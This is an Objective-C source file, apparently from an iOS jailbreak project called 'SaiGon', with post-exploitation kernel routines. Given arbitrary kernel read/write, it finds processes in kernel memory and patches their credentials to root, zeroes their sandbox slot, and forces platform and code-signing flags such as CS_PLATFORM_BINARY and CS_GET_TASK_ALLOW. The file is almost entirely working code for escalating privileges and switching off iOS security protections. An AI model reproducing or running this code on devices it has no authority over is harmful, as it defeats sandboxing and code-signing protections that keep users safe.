//
//  ipc.m
//  SaiGon
//
//  Created by hoahuynh on 31/01/2024.
//

#import <Foundation/Foundation.h>
#import "kcall.h"
#import "krw.h"
#import "offsets.h"
#import "ipc.h"

uint64_t ipc_entry_lookup_for_pid(mach_port_t port_name, pid_t pid) {
    uint64_t proc = proc_for_pid(pid);
    uint64_t task = kread64(proc + off_p_task);
    uint64_t itk_space = kread64(task + off_task_itk_space);
    uint32_t port_index = MACH_PORT_INDEX(port_name);
    uint64_t is_table = kread64(itk_space + off_ipc_space_is_table);
    uint64_t entry = is_table + port_index * 0x18;
    return entry;
}


uint64_t port_name_to_ipc_port_for_pid(mach_port_t name, pid_t pid) {
    uint64_t entry = ipc_entry_lookup_for_pid(name, pid);
    return kread64(entry);
}

uint64_t proc_for_pid(uint32_t pid) {
    uint64_t proc = get_kernproc();
    
    while (1) {
        uint32_t current_pid = kread64(proc + off_p_pid) & 0xFFFFFFFF;
        if(current_pid == pid) {
            return proc;
        }
        proc = kread64(proc + off_p_list_le_prev);
        if(!proc) {
            return -1;
        }
    }
    return -1;
}


bool rootify(pid_t pid) {
    if (!pid) return false;
    uint64_t proc = proc_for_pid(pid);
    if (@available(iOS 15.2, *)) {
        uint64_t ucred_ro = kread64(proc + 0x20);
        uint64_t ucred = kread64(ucred_ro + 0x20);
        // Get uid 0
        kwrite32(proc + 0x44, 0);
        kwrite32(ucred + 0x18 +  0x8, 0);
        kwrite32(ucred + 0x18 +  0x4, 0);
        kwrite32(ucred + 0x18 +  0x0, 0);
        // Get gid 0
        kwrite32(proc + 0x48, 0);
        kwrite32(ucred + 0x18 + 0x50, 0);
        kwrite32(ucred + 0x18 + 0x54, 0);
        kwrite32(ucred + 0x18 + 0x10, 0);
        return (kread32(proc + off_p_uid) == 0) ? true : false;
    } else {
        uint64_t ucred = kread64(proc + off_p_ucred);
        kwrite32(proc + off_p_uid, 0);
        kwrite32(proc + off_p_ruid, 0);
        kwrite32(proc + off_p_gid, 0);
        kwrite32(proc + off_p_rgid, 0);
        kwrite32(ucred + off_u_cr_uid, 0);
        kwrite32(ucred + off_u_cr_ruid, 0);
        kwrite32(ucred + off_u_cr_svuid, 0);
        kwrite32(ucred + off_u_cr_ngroups, 1);
        kwrite32(ucred + off_u_cr_groups, 0);
        kwrite32(ucred + off_u_cr_rgid, 0);
        kwrite32(ucred + off_u_cr_svgid, 0);
        return (kread32(proc + off_p_uid) == 0) ? true : false;
    }


}

uint64_t proc_by_name(char* nm) {
    uint64_t proc = get_kernproc();
    
    while (true) {
        uint64_t nameptr = proc + off_p_name;
        char name[32];
        kreadbuf(nameptr, &name, 32);
        //printf("[i] pid: %d, process name: %s\n", kread32(proc + off_p_pid), name);
        if(strcmp(name, nm) == 0) {
            return proc;
        }
        proc = kread64(proc + off_p_list_le_prev);
        if(!proc) {
            return -1;
        }
    }
    
    return 0;
}

uint64_t unsandbox(pid_t pid) {
    uint64_t proc = proc_for_pid(pid);
    if (@available(iOS 15.2, *)) {
        uint64_t proc_ro = kread64(proc + 0x20);
        uint64_t ucred = kread64(proc_ro + 0x20);
        uint64_t cr_label = kread64(ucred + off_u_cr_label);
        uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);
        kwrite64(cr_label + off_sandbox_slot , 0);
        return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;
    } else {
        uint64_t ucred = kread64(proc + off_p_ucred);
        uint64_t cr_label = kread64(ucred + off_u_cr_label);
        uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);
        kwrite64(cr_label + off_sandbox_slot, 0);
        return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;
    }
}

BOOL sandbox(pid_t pid, uint64_t sb) {
    if (!pid) return NO;
    uint64_t proc = proc_for_pid(pid);
    if (@available(iOS 15.2, *)) {
        uint64_t proc_ro = kread64(proc + 0x20);
        uint64_t ucred = kread64(proc_ro + 0x20);
        uint64_t cr_label = kread64(ucred + off_u_cr_label);
        kwrite64(cr_label + off_sandbox_slot, sb);
        
        return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == sb) ? YES : NO;
    } else {
        uint64_t ucred = kread64(proc + off_p_ucred);
        uint64_t cr_label = kread64(ucred + off_u_cr_label);
        kwrite64(cr_label + off_sandbox_slot, sb);
        
        return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == sb) ? YES : NO;
    }
   
}

pid_t pid_by_name(char* nm) {
    uint64_t proc = proc_by_name(nm);
    if(proc == -1) return -1;
    return kread32(proc + off_p_pid);
}

bool set_task_platform(pid_t pid, bool set) {
    uint64_t proc = proc_for_pid(pid);
    uint64_t task = kread64(proc + off_p_task);
    uint32_t t_flags = kread32(task + off_task_t_flags);
    
    if (set) {
        t_flags |= TF_PLATFORM;
    } else {
        t_flags &= ~(TF_PLATFORM);
    }
    
    kwrite32(task + off_task_t_flags, t_flags);
    
    return true;
}

void set_proc_csflags(pid_t pid) {
    uint64_t proc = proc_for_pid(pid);
    if (@available(iOS 15.2, *)) {
        uint64_t proc_ro = kread64(proc + 0x20);
        uint32_t csflags = kread32(proc_ro + off_p_csflags);
        csflags = csflags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;
        csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
        
        kwrite32(proc_ro + off_p_csflags, csflags);
    } else {
        uint32_t csflags = kread32(proc + off_p_csflags);
        csflags = csflags | CS_DEBUGGED | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW;
        csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL);
        kwrite32(proc + off_p_csflags, csflags);
    }
}

uint64_t get_cs_blob(pid_t pid) {
    uint64_t proc = proc_for_pid(pid);
    uint64_t textvp = kread64(proc + off_p_textvp);
    uint64_t ubcinfo = kread64(textvp + off_vnode_vu_ubcinfo);
    return kread64(ubcinfo + off_ubc_info_cs_blobs);
}

void set_csb_platform_binary(pid_t pid) {
    uint64_t cs_blob = get_cs_blob(pid);
    kwrite32(cs_blob + off_cs_blob_csb_platform_binary, 1);
}

void platformize(pid_t pid) {
    set_task_platform(pid, true);
    set_proc_csflags(pid);
    set_csb_platform_binary(pid);
}
